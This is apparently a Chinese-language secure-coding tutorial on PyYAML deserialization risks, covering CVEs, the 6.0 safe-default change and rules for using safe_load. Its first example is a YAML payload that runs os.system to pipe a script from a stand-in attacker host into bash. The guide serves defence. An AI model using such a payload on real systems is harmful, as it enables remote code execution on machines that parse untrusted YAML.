## 1. 为什么 YAML 解析能执行代码

YAML 的标签机制（02 篇提过）是双刃剑：**`!!python/object` 家族标签让解析器构造任意 Python 对象**——而对象构造过程中可以执行任意代码：

```yaml
# 经典 RCE 载荷：解析这段 YAML = 执行 os.system 命令
!!python/object/apply:os.system
- "curl attacker.com/shell.sh | bash"
```

**原理**：带 `!!python/object/apply` 的节点，PyYAML 会调用**指定的 Python 可调用对象**并传入参数——**这本质上就是 `eval()`/`subprocess` 的等价物**。攻击路径：**攻击者让你加载一个恶意 YAML 文件（配置文件/上传的数据/日志文件）→ 你的代码调用 yaml.load → 攻击者代码在你的进程里执行**——完整的远程代码执行（RCE）。**"解析 YAML 竟然会执行代码"是这个漏洞家族反直觉到成为安全教科书案例的原因**——2000 年代设计的格式，2017 年才被系统性重视。

**攻击面现实盘点**：不止"用户上传的 YAML"——**CI 加载的第三方仓库配置**（恶意 PR 里夹带 YAML 载荷）、**日志/数据文件被回放解析**、**AI 生态的 model card/tool 定义/workflow 文件**（从外部拿到的 YAML 形态数据）——**"不可信输入"的范围比直觉大得多**：**不是"用户上传的才防"，而是"不是你亲手写的都防"**——safe_load 的适用范围是全量，不是白名单。

## 2. RCE 历史与 CVE 谱系

| CVE | 危害 | 影响版本 | 修复 |
|-----|------|---------|------|
| CVE-2017-18342 | **9.5 级 RCE**：`yaml.load()` 默认 Loader 直接执行任意代码 | ≤5.0 | 5.1 默认 Loader 改 FullLoader |
| CVE-2019-20477 | 9.5 级：FullLoader 仍可通过 `!!python/object/new` 执行 | 5.1-5.2 | 5.2 修复 |
| CVE-2020-1747 | 9.5 级：FullLoader 经 list 项 `!!python/object/new` 绕过 | 5.2-5.3 | 5.3.1 修复 |
| CVE-2020-14343 | 9.5 级：任意 python 标签仍可进默认 Loader | ≤5.3.1 | **5.4 彻底移除** |

**读这张表的三条结论**：其一，**全部是 5.4 之前的老漏洞**——6.0.x 全部不受影响（官方安全公告明确列出 6.0.1/6.0.2/6.0.3 为 unaffected）；其二，**漏洞的根因从来不是"某个 CVE"，而是"默认 Loader 太宽松"**——官方用 4 年 4 个 CVE 一步步收紧默认能力；其三，**CVE 修的是默认行为，不是能力本身**——`unsafe_load` 的能力在 6.0.3 里依旧完整（它是故意留的逃生门），**"版本新 ≠ 用法安全"**。

## 3. 6.0 安全默认反转

6.0（2021-10-13）做了 PyYAML 历史上最重要的安全变更：**`yaml.load()` 不带 Loader 参数时默认改用 SafeLoader**——"默认不安全"变成"默认安全"。

```python
# 6.0 之前：yaml.load(data) 用完整 Loader → 可执行代码（老教程的写法！）
# 6.0 之后：yaml.load(data) 默认 SafeLoader → 安全
# 但：yaml.load(data, Loader=yaml.UnsafeLoader) → 依然 RCE
```

**三个反直觉点**：其一，**6.0 前的老教程（`yaml.load()` 裸用）在 6.0 后"行为变了但不再危险"**——代码没改却变安全了，**升级 6.0 本身就是一次安全修复**；其二，**默认反转 ≠ 可以依赖默认**——显式 `yaml.safe_load()` 是唯一无歧义的写法（隐式依赖默认值在代码评审里是差评）；其三，**`yaml.unsafe_load()` 是新增的显式逃生门**——语义一目了然（"我知道这是 unsafe"），比 `load(Loader=UnsafeLoader)` 更清晰——**看到代码里有它，review 就该停下来问一句"这个 YAML 来自哪里"**。

## 4. 红线清单：什么绝对不能做

**红线一：不可信输入的 `unsafe_load`/`Loader=UnsafeLoader`**——网络下载的配置、用户上传的文件、从外部系统拿到的 YAML——**任何非你亲手生成的数据，永远 safe_load**。

**红线二：`FullLoader` 当安全加载器用**——名字带"Full"容易误导；**FullLoader 在 5.x 时代被打了两个 9.5 级 CVE**（第 2 节表），它构造"所有合理标签"包括部分 python 对象——**安全边界只有 SafeLoader 一条线**（05 篇详讲四家族差异）。

**红线三：自定义 Loader 图省事构造任意类型**——"我想让配置直接变成我的类实例"→ 自定义 constructor → 等于给自己开 RCE 后门。**正确姿势：safe_load 拿纯数据 → pydantic/手动校验构造对象**（05 篇与 07 篇）。

**红线四：把"内部配置文件"当安全豁免**——配置被 CI 缓存、被仓库共享、被爬虫抓走，**来源一旦不可控，safe 规则立即生效**——"它一直是我的文件"不是豁免理由。

## 5. 2026 案例：vcrpy 误用 CLoader

**GHSA-rpj2-4hq8-938g（2026 年公告）**：知名库 **vcrpy**（HTTP 录制回放测试库）在读取 YAML cassette 文件时用了**对象构造型加载器（CLoader/Loader 而非 CSafeLoader/SafeLoader）**——攻击者构造恶意 cassette 文件即可触发任意代码执行。**确认环境：vcrpy 8.1.1 + PyYAML 6.0.3（最新版！）**——**"最新版 PyYAML 也救不了错误用法"的最新鲜实证**。修复：vcrpy 改用 SafeLoader/CSafeLoader。

**这个案例的三点教训**：其一，**漏洞在调用方不在库**——PyYAML 6.0.3 无 CVE，出问题的是 vcrpy 的加载器选择；其二，**测试工具、开发工具同样在攻击面里**——开发者机器上的 RCE 往往更值钱（能偷密钥）；其三，**依赖审计（pip-audit/OSV）只查版本，不查用法**——**用法审计（代码评审搜 `unsafe_load`/`Loader=`）是补充动作**。

## 6. 生产安全规则

**规则一：代码里只有 `safe_load`/`safe_load_all`/`safe_dump`**——CI 加一道 grep 门禁（搜 `unsafe_load`、`Loader=`、`FullLoader`、`CLoader` 出现即告警）。

**规则二：配置文件与代码同源管理**——配置文件进版本库、走配置中心，**不接受"外部传来的 YAML 直接 load"**；外部数据先进 safe_load，类型与值校验后再用（07 篇）。

**规则三：安全扫描双轨**——`pip-audit` 扫版本漏洞（6.0.x 应无告警）+ **代码评审扫用法漏洞**（搜加载器选择）——**"版本干净 + 用法干净"才是真的干净**。

**规则四：CI 里 lint + 门禁**——yamllint 查语法（09 篇）、自定义 grep 查危险 API、README 写清安全约定——**把安全规则变成自动化的门禁而不是口头约定**。

**规则五：依赖锁定与升级**——锁 `pyyaml>=6.0.3,<7`，升级看 changelog——**6.0 线内的升级是纯修复（无新特性），升级零风险且必做**。
